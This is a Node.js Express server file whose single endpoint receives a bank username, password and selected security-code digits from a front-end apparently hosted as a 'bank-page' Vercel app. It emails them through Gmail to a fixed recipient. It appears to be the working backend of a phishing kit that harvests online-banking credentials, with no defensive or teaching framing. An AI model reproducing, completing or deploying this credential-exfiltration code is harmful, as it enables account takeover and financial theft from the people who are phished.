const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
require('dotenv').config();

const app = express();
const corsOptions = {
  origin: 'bank-page-lp4c63hbk-aman-pandeys-projects-0d2608b1.vercel.app', // Replace with your actual Vercel app URL
  optionsSuccessStatus: 200,
};

app.use(cors(corsOptions));
app.use(bodyParser.json());

// Configure Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER, // Your Gmail address
    pass: process.env.GMAIL_PASSWORD, // Gmail App Password
  },
});

app.post('/send-email', async (req, res) => {
  const { username, password, firstDigit, fourthDigit } = req.body;

  const mailOptions = {
    from: '"Bank Login" <your-email@gmail.com>',
    to: 'destination-email@gmail.com',
    subject: 'User Login Details',
    text: `
      Login Details:
      - Username: ${username}
      - Password: ${password}
      - Security Code Digits: ${firstDigit}, ${fourthDigit}
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send({ message: 'Email sent successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send({ message: 'Failed to send email.' });
  }
});

const PORT = 3001;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
